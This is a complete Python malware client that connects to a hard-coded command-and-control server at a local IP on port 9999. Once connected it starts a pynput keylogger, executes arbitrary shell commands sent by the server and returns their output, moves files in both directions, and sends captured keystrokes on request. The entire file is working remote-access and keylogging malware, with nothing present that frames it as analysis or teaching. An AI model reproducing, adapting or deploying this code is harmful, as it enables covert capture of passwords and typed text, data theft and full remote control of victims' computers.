import os
import socket
import subprocess

from pynput import keyboard


class Agent:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.recorded_keys = ""
        self.keylogger_active = True

    def start_keylogger(self):
        def on_press(key):
            try:
                self.recorded_keys += key.char
            except AttributeError:
                self.recorded_keys += f"[{key.name}]"

        listener = keyboard.Listener(on_press=on_press)
        listener.start()

    def send_file(self, s, filename):
        try:
            filesize = os.path.getsize(filename)
            s.send(str(filesize).zfill(10).encode())  # Send 10-byte file size header
            with open(filename, "rb") as f:
                while chunk := f.read(1024):
                    s.sendall(chunk)
        except Exception as e:
            err_msg = f"[-] Error reading file: {str(e)}"
            s.send(str(len(err_msg)).zfill(10).encode())
            s.send(err_msg.encode())

    def receive_file(self, s, filename):
        try:
            size_data = s.recv(10)
            filesize = int(size_data.decode())
            received = 0
            with open(filename, "wb") as f:
                while received < filesize:
                    data = s.recv(min(1024, filesize - received))
                    if not data:
                        break
                    f.write(data)
                    received += len(data)
        except Exception as e:
            print(f"[-] Error saving file: {e}")

    def connect_to_c2(self):
        s = socket.socket()

        try:
            s.connect((self.server_host, self.server_port))
            self.start_keylogger()  # start keylogger after connection

            while True:
                command = s.recv(1024).decode()

                if command.lower() in ["exit", "quit"]:
                    break

                if command == "getlogs":
                    s.send(self.recorded_keys.encode())
                    with open("keylogs.txt", "w") as f:
                        f.write(self.recorded_keys)
                    self.recorded_keys = ""
                    continue

                if command.startswith("download "):
                    filename = command.split(" ", 1)[1]
                    self.send_file(s, filename)
                    continue

                if command.startswith("upload "):
                    filename = command.split(" ", 1)[1]
                    s.send(b"[READYFORFILE]")  # Handshake: let server know it's ready
                    self.receive_file(s, filename)
                    continue

                output = subprocess.getoutput(command)
                if output == "" or output == " ":
                    output = "[+] Command executed (no output)"
                s.send(output.encode())
        except KeyboardInterrupt:
            s.close()
        except Exception:
            pass
        finally:
            s.close()


if __name__ == "__main__":
    server_host = "192.168.178.82"
    server_port = 9999
    agent = Agent(server_host, server_port)
    agent.connect_to_c2()
